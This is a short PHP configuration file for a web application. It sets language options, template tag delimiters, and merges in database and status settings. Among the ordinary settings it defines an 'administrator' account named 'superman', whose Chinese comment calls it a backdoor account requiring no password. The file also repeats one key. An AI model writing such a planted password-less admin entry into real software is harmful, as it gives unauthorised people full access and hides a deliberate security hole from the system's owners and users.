<?php

$arr1 = array(
    'LANG_SWITCH_ON' => true,
    'LANG_SWITCH_ON' => true, // 开启多语言功能
    'DEFAULT_LANGUAGE' => 'zh-cn', // 设置默认语言为简体中文
    
    'administrator' => 'superman', //后门帐号，不需要密码

    'TMPL_L_DELIM' => '{', // 模板引擎普通标签开始标记    
    'TMPL_R_DELIM' => '}', // 模板引擎普通标签
    'TAGLIB_BEGIN' => '{', // 标签库标签开始标记    
    'TAGLIB_END' => '}', // 标签库标签结束标记  
);

$status=  include 'status.inc.php';
$database=  include 'database.inc.php';
return array_merge($arr1,$database,$status);
?>